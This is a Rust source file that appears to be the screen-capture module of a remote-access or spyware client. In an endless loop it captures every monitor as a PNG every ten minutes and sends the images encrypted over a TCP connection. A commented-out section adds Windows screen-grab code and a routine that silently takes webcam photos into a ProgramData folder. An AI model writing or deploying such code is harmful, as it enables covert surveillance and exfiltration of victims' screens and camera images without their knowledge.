use std::{io::{BufWriter, Write}, sync::Arc, time::Duration};
use shared::{encrypted_write_from_key, DataPacket, StatusType};
use tokio::{net::tcp::OwnedWriteHalf, sync::{watch, Mutex}};
use xcap::Monitor;

pub struct Screenshot {
    pub monitors: Vec<Monitor>,
    pub writer: Arc<Mutex<OwnedWriteHalf>>,
    pub key: [u8; 32],
    pub notifier: watch::Sender<StatusType>,
}


impl Screenshot {


    pub fn new(writer: Arc<Mutex<OwnedWriteHalf>>, key: [u8 ;32], notifier: watch::Sender<StatusType>) -> xcap::XCapResult<Self> {
        let monitors = Monitor::all()?;
        Ok(Self {
            writer,
            key,
            notifier,
            monitors,
        })
    }
    
    pub async fn process_screenshots(&self) -> std::io::Result<()> {
        loop {
            for monitor in &self.monitors {
                if let Ok(image) = screenshot(monitor) {
                    let data = DataPacket {
                        module_type: shared::ModuleType::Capture,
                        data: image,
                    };
                    encrypted_write_from_key(self.writer.clone(), &self.key, data).await?;
                    println!("sent image");
                }
            }
            tokio::time::sleep(Duration::from_secs(600)).await;
        
        }
    }

    
}

fn screenshot(monitor: &Monitor) -> xcap::XCapResult<Vec<u8>>{
    let v = Vec::new();
    let image = monitor.capture_image()?;
    let mut ret = BufWriter::new(std::io::Cursor::new(v));
    image.write_to(&mut ret, image::ImageFormat::Png).unwrap();
    ret.flush().unwrap();

    if let Ok(cursor) = ret.into_inner() {
        return Ok(cursor.into_inner())
    }
    Err(xcap::XCapError::new("unable to unwrap bufwriter"))
}







/* 
pub unsafe fn get_screenshot() -> windows::core::Result<()> {
    let desktop_h = GetDesktopWindow();
    let dc = GetWindowDC(desktop_h);
    //let dc = GetDC(HWND(0));
    let compatible_dc = CreateCompatibleDC(dc);
    let width = GetDeviceCaps(dc    , HORZRES);
    let height = GetDeviceCaps(dc, VERTRES);
    
    println!("width: {}, height: {}", width, height);

    let comp_hbitmap = CreateCompatibleBitmap(compatible_dc, width, height);

    SelectObject(compatible_dc, comp_hbitmap);

    BitBlt(compatible_dc, 0, 0, width, height, dc, -1920, 0, SRCCOPY)?;

    let buf_size = width * height * 4;

    let mut bitmap_info = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: width,
            biHeight: -height,
            biPlanes: 1,
            biBitCount: 32,
            biSizeImage: buf_size as u32,
            biCompression: 0,
            ..Default::default()
        },
        ..Default::default()
    };

    let mut buffer = vec![0u8; buf_size as usize];

    let getbits_failed = GetDIBits(
        dc,
        comp_hbitmap,
        0,
        height as u32,
        Some(buffer.as_mut_ptr().cast()),
        &mut bitmap_info,
        DIB_RGB_COLORS
    );

    if getbits_failed == 0 {
        return Err(Error::empty())
    }

    let zerod = buffer.iter().all(|num| *num == 0);
    println!("{}", zerod);

    
    



    //let bitmap_obj = SelectObject(compatible_dc, obj);
    //let mut bitmap_info: BITMAP = BITMAP { bmType: 0, bmWidth: 0, bmHeight: 0, bmWidthBytes: 0, bmPlanes: 0, bmBitsPixel: 0, bmBits: 0 as *mut c_void };
    //let info_pointer: *mut c_void = &mut bitmap_info as *mut _ as *mut c_void;
    //let written = GetObjectA(bitmap_obj, size_of::<BITMAP>() as i32, Some(info_pointer));
    //println!(" GetobjectA written: {}", written);
    //println!("{:?}", bitmap_info);
    //let size: usize = bitmap_info.bmWidthBytes as usize * bitmap_info.bmHeight as usize;
    //let mut buf: Vec<u8> = vec![0; (width * height * 3) as usize];
    //let bit_values: Vec<u8> = *bitmap_info.bmBits.cast();

    //let f = GetDIBits(dc, bitmap, 0, 1079,
     //    Some(&mut buf as *mut _ as *mut c_void), &mut binfo, DIB_USAGE(0));
    //println!("f: {:?}", f);
    //println!("binfo: {:?}", binfo);
    //println!("{:?}", buf);

    let _ = DeleteDC(compatible_dc);
    ReleaseDC(HWND(0), dc); 

    let image = RgbaImage::from_raw(width as u32, height as u32, buffer);
    if image.is_some() {
        image.unwrap().save("myimage.png").unwrap()
    }
    
    Ok(()) 
}


pub async fn get_webcam()  -> windows::core::Result<()>{
     let path = "C:\\ProgramData\\temp\\";
    if !try_exists(&path).await? {
        create_dir(&path).await?;
    }
    let path = format!("{}uwu.png", path);
    println!("1");
    File::options().create(true).write(true).open(&path).await?;
    println!("2");
    let storage_file = StorageFile::GetFileFromPathAsync(&HSTRING::from(&path))?.await?;
    println!("3");
    let cap = MediaCapture::new()?;
    cap.InitializeAsync()?.await?;
    let photocap = cap.PrepareLowLagPhotoCaptureAsync(&ImageEncodingProperties::CreatePng().unwrap())?.await?;
    println!("4");
    let photo = photocap.CaptureAsync()?.await?;
    println!("5");
    photocap.FinishAsync()?.await?;
    println!("6");
    let frame = photo.Frame()?;
    println!("7");
    let bitmap = frame.SoftwareBitmap()?;
    println!("8");
    let stream = storage_file.OpenAsync(FileAccessMode::ReadWrite)?.await?;
    println!("9");
    let encoder = BitmapEncoder::CreateAsync(BitmapEncoder::PngEncoderId()?, &stream)?.await?;
    println!("10");
    encoder.SetSoftwareBitmap(&bitmap)?;
    println!("11");
    encoder.SetIsThumbnailGenerated(true)?;
    encoder.FlushAsync()?.await?;
    println!("12"); 
    Ok(())  
} */